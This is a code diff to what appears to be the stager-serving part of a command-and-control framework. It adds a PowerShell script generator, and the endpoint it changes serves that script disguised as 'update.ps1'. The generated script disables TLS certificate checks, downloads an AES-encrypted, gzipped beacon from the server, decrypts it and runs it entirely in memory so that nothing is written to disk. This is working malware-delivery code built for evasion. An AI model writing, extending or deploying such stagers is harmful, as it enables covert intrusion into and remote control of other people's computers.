@@ -64,6 +64,30 @@ def _build_ps_script(enc_key: str, blob_url: str) -> str:
     )
 
 
+def _build_ps_script_iex(enc_key: str, blob_url: str) -> str:
+    """PS stager for a PowerShell beacon: decrypt + IEX in memory (no disk write)."""
+    key_hex, iv_hex = enc_key.split(":")
+    key_dec = ",".join(str(b) for b in bytes.fromhex(key_hex))
+    iv_dec  = ",".join(str(b) for b in bytes.fromhex(iv_hex))
+    return (
+        "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
+        "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]'Tls12,Tls';"
+        f"$k=[byte[]]@({key_dec});"
+        f"$v=[byte[]]@({iv_dec});"
+        f"$b=(New-Object Net.WebClient).DownloadData('{blob_url}');"
+        "$a=New-Object Security.Cryptography.AesCryptoServiceProvider;"
+        "$a.Mode=[Security.Cryptography.CipherMode]::CBC;"
+        "$a.Padding=[Security.Cryptography.PaddingMode]::PKCS7;"
+        "$a.Key=$k;$a.IV=$v;"
+        "$d=$a.CreateDecryptor().TransformFinalBlock($b,0,$b.Length);"
+        "$ms=New-Object IO.MemoryStream(,$d);"
+        "$gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);"
+        "$sr=New-Object IO.StreamReader($gz,[Text.Encoding]::UTF8);"
+        "$c=$sr.ReadToEnd();"
+        "[ScriptBlock]::Create($c).Invoke()"
+    )
+
+
 def _check_active(token: str, db: Session) -> StagerToken:
     """Fetch a stager token and raise 404/410 if missing, expired or exhausted."""
     st = db.query(StagerToken).filter(StagerToken.token == token).first()
@@ -277,13 +301,22 @@ def serve_stager_blob(token: str, db: Session = Depends(get_db)):
 
 @router.get("/s/{token}/ps")
 def serve_stager_ps(token: str, request: Request, db: Session = Depends(get_db)):
-    """Serve a PowerShell script that downloads, decrypts and runs the beacon."""
+    """Serve a PowerShell stager that downloads, decrypts and executes the beacon.
+
+    - If the beacon is a PS beacon (lang='ps'): decrypts and IEX-executes in memory.
+    - Otherwise (lang='py'): decrypts, writes to a temp .py file and runs pythonw.
+    """
     st = _check_active(token, db)
     if not st.enc_key:
         raise HTTPException(status_code=404, detail="No encrypted payload for this stager")
     base = str(request.base_url).rstrip("/")
     blob_url = f"{base}/s/{token}/blob"
-    script = _build_ps_script(st.enc_key, blob_url)
+
+    if st.lang == "ps":
+        script = _build_ps_script_iex(st.enc_key, blob_url)
+    else:
+        script = _build_ps_script(st.enc_key, blob_url)
+
     return PlainTextResponse(
         content=script,
         headers={"Content-Disposition": "attachment; filename=update.ps1"},
